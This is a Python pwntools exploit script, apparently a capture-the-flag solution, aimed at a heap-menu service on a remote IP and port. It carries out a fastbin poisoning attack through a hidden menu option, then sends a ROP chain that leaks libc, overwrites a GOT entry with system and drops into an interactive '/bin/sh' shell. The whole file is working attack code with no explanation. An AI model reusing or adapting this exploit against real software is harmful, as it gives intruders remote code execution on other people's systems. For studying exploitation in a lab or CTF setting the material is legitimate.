from pwn import *

#s = remote('192.168.50.4',1234)
s = remote('52.175.144.148', 9901)
def malloc(size,idx,dat):
  s.recvuntil('$')
  s.send('1\n')
  s.recvuntil(':')
  s.send(str(idx)+'\n')
  s.recvuntil(':')
  s.send(str(size)+'\n')
  s.recvuntil(':')
  s.send(dat)
def free(idx):
  s.recvuntil('$')
  s.send('2\n')
  s.recvuntil(':')
  s.send(str(idx)+'\n')
raw_input()
fake = 0x602075 - 0x8
malloc(0x68,1,'1234\n')
free(1)
s.recvuntil('$')
s.send('201527\n')
s.recvuntil(':')
s.send(p64(fake)+'\n')
malloc(0x68,1,'1234\n')
malloc(0x68,1,'/bin/sh\x00'+'A'*25+'\n')
s.send('4\n')
s.recvuntil(':')
gadget1 = 0x00000000004008a0 # pop rdi ; ret
gadget2 = 0x0000000000400d11 # pop rsi ; pop r15 ; ret
rop = ""
rop += "A"*0x408
#rop += "A"*8
rop += p64(gadget1)
rop += p64(0x602030)
rop += p64(0x400600)
rop += p64(gadget1)
rop += p64(0)
rop += p64(gadget2)
rop += p64(0x602018)*2
rop += p64(0x400610)
rop += p64(gadget1)
rop += p64(0x602075+0x8)
rop += p64(0x4005F0)
s.send(rop+'\n')
s.recvuntil('$')
s.send('5\n')
s.recv(1024)
#print util.fiddling.hexdump(s.recv(1024))
libc = u64(s.recv(1024)[:]+'\x00\x00') - 0x21E50
system = libc + 0x46590
log.info(hex(libc))
s.send(p64(system)+'\n')
s.interactive()
